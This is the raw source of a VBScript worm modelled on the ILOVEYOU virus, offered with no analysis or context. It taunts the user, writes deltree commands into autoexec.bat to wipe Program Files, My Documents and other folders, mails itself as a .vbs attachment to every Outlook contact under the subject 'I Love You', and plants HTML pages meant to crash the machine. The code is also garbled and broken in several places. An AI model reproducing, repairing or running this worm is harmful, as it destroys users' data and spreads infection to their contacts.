dim fso,dirsystem,eq,ctr,file,vbscopy,dow
MsgBox "Oops"
MsgBox "You can't stop me"
MsgBox "So don't bother trying"
MsgBox "Have fun!"
Const ForReading = 1, ForWriting = 2, ForAppending = 8
Set fso = CreateObject("Scripting.FileSystemObject")
set deleter = fso.CreateTextFile("C:\autoexec.bat", ForWriting, True)
set standardcrash = fso.CreateTextFile("C:\Program Files\Accessories\HyperTerminal\bang.html", ForWriting, True)
set bad = fso.OpenTextFile("C:\Program Files\Accessories\HyperTerminal\bang2.html", ForWriting, True)
set incase = fso.CreateTextFile("C:\Program Files\Accessories\HyperTerminal\bang2.html", ForWriting, True)

MsgBox "Section 2/7"
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
end if
c.Copy("\bang.vbs")
MsgBox "Section 3/7"

sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function

MsgBox "Section 4/7"
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function

MsgBox "Section 5/7"
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malea
=
d)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "I Love You"
male.Body = vbcrlf&"This is not the the LoveLetter.
Because the subject isn't "ILOVEYOU"."
male.Attachments.Add(dirsystem&"\some-thing-else.vbs")
male.Send
regedit.RegWrite =
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite =
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite =
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub

MsgBox "Section 6/7"
sub justincase()
dim incase
set incase = fso.CreateTextFile("C:\Program Files\Accessories\HyperTerminal\bang2.html", ForWriting, True)
incase.write"<HTML>
<HEAD>
<Title>New Crash</Title>
</HEAD>
<BODY>
<xml:namespace ns='CallFixPage' prefix='HS'>
<STYLE>
        @media all{HS\:HISTORY {behavior:url(#default);}}
</STYLE>
<!--XML code -->
<HS:HISTORY ID="HS" />
<!-- End XML code -->

</BODY>
</HTML>"
end sub

MsgBox "Section 7/7"
sub writedeltree()
dim deleter
deleter.write"deltree C:\program files\
deltree C:\my documents\
deltree C:\games\
deltree C:\windows\profiles\
deltree C:\work\"
deleter.close
end sub
sub crash
dim standardcrash, open2
standardcrash.write"<html>
<head>
<meta http-equiv="refresh" content='0;
URL="file://localhost/c/dev/con/con"'>
<meta http-equiv="refresh" content='5;
URL="file://localhost/c/Program Files\Accessories\HyperTerminal\bang2.html"'>
</head>
<body>
<h2>Your computer will crash in 2/5 seconds.</h2>
<p>
<h3>Have a nice day</h3>
</body>
</html>"
set open2 = fso.OpenTextFile("C:\Program Files\Accessories\HyperTerminal\bang.html", ForWriting, True)
open2.close
MsgBox "I'm done now!!"
end sub

end sub